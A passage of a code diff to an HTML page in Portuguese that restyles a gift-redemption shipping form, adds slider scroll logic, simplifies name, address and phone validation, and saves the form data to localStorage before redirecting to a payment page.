-                            class="input-with-icon" style="padding-left: 90px !important;" maxlength="13">
+                            class="input-with-icon" style="padding-left: 110px !important;" maxlength="13">
                     </div>
                 </div>
 
@@ -515,26 +716,33 @@
                     <label>Email</label>
                     <div class="input-wrapper">
                         <div class="flag-icon">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
-                                fill="none" stroke="#666" stroke-width="2" stroke-linecap="round"
-                                stroke-linejoin="round">
-                                <rect x="2" y="4" width="20" height="16" rx="2"></rect>
-                                <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path>
+                            <!-- Email Icon (User Provided) -->
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640" width="18" height="18">
+                                <path fill="#888"
+                                    d="M112 128C85.5 128 64 149.5 64 176C64 191.1 71.1 205.3 83.2 214.4L291.2 370.4C308.3 383.2 331.7 383.2 348.8 370.4L556.8 214.4C568.9 205.3 576 191.1 576 176C576 149.5 554.5 128 528 128L112 128zM64 260L64 448C64 483.3 92.7 512 128 512L512 512C547.3 512 576 483.3 576 448L576 260L377.6 408.8C343.5 434.4 296.5 434.4 262.4 408.8L64 260z" />
                             </svg>
                         </div>
-                        <input type="email" name="email" required placeholder="Ex: joao@email.com"
-                            class="input-with-icon">
+                        <input type="email" name="email" required placeholder="Ex: ana@email.com"
+                            class="input-with-icon" style="padding-left: 48px !important;">
                     </div>
                 </div>
 
-                <button type="submit" class="btn-redeem" style="font-size: 16px; padding: 15px;">
-                    CONFIRMAR ENVIO
+                <input type="hidden" name="nif" value="">
+
+                <button type="submit" class="btn-redeem" style="margin-top: 25px; width: 100%;">
+                    <!-- Gift Box SVG -->
+                    <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640">
+                        <path fill="#ffeef9"
+                            d="M385.5 132.8C393.1 119.9 406.9 112 421.8 112L424 112C446.1 112 464 129.9 464 152C464 174.1 446.1 192 424 192L350.7 192L385.5 132.8zM254.5 132.8L289.3 192L216 192C193.9 192 176 174.1 176 152C176 129.9 193.9 112 216 112L218.2 112C233.1 112 247 119.9 254.5 132.8zM344.1 108.5L320 149.5L295.9 108.5C279.7 80.9 250.1 64 218.2 64L216 64C167.4 64 128 103.4 128 152C128 166.4 131.5 180 137.6 192L96 192C78.3 192 64 206.3 64 224L64 256C64 273.7 78.3 288 96 288L544 288C561.7 288 576 273.7 576 256L576 224C576 206.3 561.7 192 544 192L502.4 192C508.5 180 512 166.4 512 152C512 103.4 472.6 64 424 64L421.8 64C389.9 64 360.3 80.9 344.1 108.4zM544 336L344 336L344 544L480 544C515.3 544 544 515.3 544 480L544 336zM296 336L96 336L96 480C96 515.3 124.7 544 160 544L296 544L296 336z" />
+                    </svg>
+                    CONTINUAR
                 </button>
             </form>
         </div>
     </div>
 
     <script>
+        // Modal & Form Logic
         function openModal() {
             document.getElementById('redemptionModal').style.display = 'flex';
         }
@@ -550,34 +758,49 @@
             }
         }
 
-        // --- Auto Formatting Logic ---
-        const zipInput = document.getElementById('zipInput');
-        const phoneInput = document.getElementById('phoneInput');
+        // Slider Logic
+        const track = document.getElementById('sliderTrack');
+        const indicators = document.querySelectorAll('.indicator');
 
-        // Zip: 0000-000
+        // Update indicators on scroll
+        track.addEventListener('scroll', () => {
+            const scrollLeft = track.scrollLeft;
+            const width = track.offsetWidth;
+            const index = Math.round(scrollLeft / width);
+
+            indicators.forEach(ind => ind.classList.remove('active'));
+            if (indicators[index]) indicators[index].classList.add('active');
+        });
+
+        // Click on indicator to scroll
+        indicators.forEach(ind => {
+            ind.addEventListener('click', (e) => {
+                const index = parseInt(e.target.getAttribute('data-index'));
+                const width = track.offsetWidth;
+                track.scrollTo({
+                    left: width * index,
+                    behavior: 'smooth'
+                });
+            });
+        });
+
+        // Form Formatting
+        const zipInput = document.getElementById('zipInput');
         zipInput.addEventListener('input', function (e) {
             let val = e.target.value.replace(/\D/g, '');
             if (val.length > 7) val = val.substring(0, 7);
-
             if (val.length > 4) {
                 val = val.substring(0, 4) + '-' + val.substring(4);
             }
             e.target.value = val;
         });
 
-        // Phone: Automatically add spaces or +351 if needed, simplifying to 9 digits visual
+        const phoneInput = document.getElementById('phoneInput');
         phoneInput.addEventListener('input', function (e) {
             let val = e.target.value.replace(/\D/g, '');
-            // Allow user to type 351, strip it for local formatting, logic can vary.
-            // Simplest: Limit to 9 chars for PT number, or max 12 with code.
-
-            // User requested "limitar digitos". Assuming PT mobile: 9xx xxx xxx
-            if (val.startsWith('351')) {
-                val = val.substring(3);
-            }
+            if (val.startsWith('351')) val = val.substring(3);
             if (val.length > 9) val = val.substring(0, 9);
 
-            // Format: 123 456 789
             if (val.length > 6) {
                 val = val.substring(0, 3) + ' ' + val.substring(3, 6) + ' ' + val.substring(6);
             } else if (val.length > 3) {
@@ -586,68 +809,35 @@
             e.target.value = val;
         });
 
-
+        // Submit
         function submitForm(e) {
             e.preventDefault();
-
             const formData = new FormData(e.target);
             const data = Object.fromEntries(formData.entries());
 
-            // --- STRICT VALIDATION ---
-
-            // 1. Name Check (At least 2 words)
-            const nameParts = data.name.trim().split(/\s+/);
-            if (nameParts.length < 2 || nameParts[0].length < 2 || nameParts[1].length < 2) {
-                alert("Por favor, introduza o seu Nome Completo (Nome e Apelido).");
+            if (data.name.split(' ').length < 2) {
+                alert("Por favor, introduza o seu Nome Completo.");
                 return;
             }
-
-            // 2. Address Check
-            if (data.address.trim().length < 5) {
+            if (data.address.length < 5) {
                 alert("Por favor, introduza uma Morada completa.");
                 return;
             }
 
-            // 3. Zip Code Check (Format: 0000-000)
-            const zipRegex = /^\d{4}-\d{3}$/;
-            if (!zipRegex.test(data.zip)) {
-                alert("O Código Postal deve estar no formato: 0000-000");
-                return;
-            }
-
-            // 4. City Check
-            if (data.city.trim().length < 3) {
-                alert("Por favor, introduza uma Cidade válida.");
-                return;
-            }
-
-            // 5. Phone Check (Strict 9 digits)
-            // Strip spaces first
             let cleanPhone = data.phone.replace(/\s/g, '');
-            // Strip prefixes if user typed them despite our logic
-            if (cleanPhone.startsWith('351')) cleanPhone = cleanPhone.substring(3);
-            if (cleanPhone.startsWith('00351')) cleanPhone = cleanPhone.substring(5);
-            if (cleanPhone.startsWith('+351')) cleanPhone = cleanPhone.substring(4);
-
-            if (!/^\d{9}$/.test(cleanPhone)) {
-                alert("Número de Telemóvel inválido. Deve ter 9 dígitos (9xx xxx xxx).");
+            if (cleanPhone.length !== 9) {
+                alert("Por favor, introduza um número válido.");
                 return;
             }
 
-            // Update cleaned phone in data
-            data.phone = cleanPhone;
+            if (window.fbq) fbq('track', 'InitiateCheckout');
 
-            if (window.fbq) {
-                fbq('track', 'InitiateCheckout');
-            }
-
-            // Append 351 (Standardize storage)
-            data.phone = '351' + data.phone;
-
+            data.phone = '351' + cleanPhone;
             localStorage.setItem('shippingData', JSON.stringify(data));
             window.location.href = 'payment.html';
         }
     </script>
+    <script src="/static/js/notifications.js"></script>
 </body>
 
 </html>
